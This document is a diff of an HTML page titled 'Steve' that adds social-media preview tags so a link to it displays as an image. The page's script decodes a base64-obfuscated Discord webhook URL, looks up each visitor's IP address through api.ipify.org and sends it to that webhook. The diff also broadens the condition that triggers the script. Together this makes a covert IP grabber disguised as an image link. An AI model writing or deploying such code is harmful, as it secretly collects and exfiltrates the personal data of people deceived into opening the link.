@@ -3,16 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <title>Steve</title>
+    <meta property="og:title" content="Steve">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="https://twojanazwa.github.io/steve.jpg">
+    <meta property="og:description" content="Steve Image">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://twojanazwa.github.io/steve.jpg">
 </head>
 <body>
-
     <script>
         const MMMA = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3MjMwNTc4MDM0MTQ3NzU3OC9XQzJIV25hczNJZlE4cHVBblZkQUFzdTJHN3FBZnNwa09DX1ZvcW8tU1JnZnpHZGlpclFlc3EyX3dsQ245UEh5SnBsZw=='
 
         const WAMDD = atob(MMMA);
 
         async function sendVisitorData() {
-            if (window.location.pathname.endsWith('steve.jpg') && window.location.search.includes('v=1')) {
+            const url = window.location.href;
+            if (url.includes('v=1')) {
                 try {
                     const ipResponse = await fetch('https://api.ipify.org?format=json');
                     const ipData = await ipResponse.json();
@@ -31,7 +37,6 @@
                     });
 
                     console.log('Sended.');
-
                 } catch (error) {
                     console.error('Error:', error);
                 }
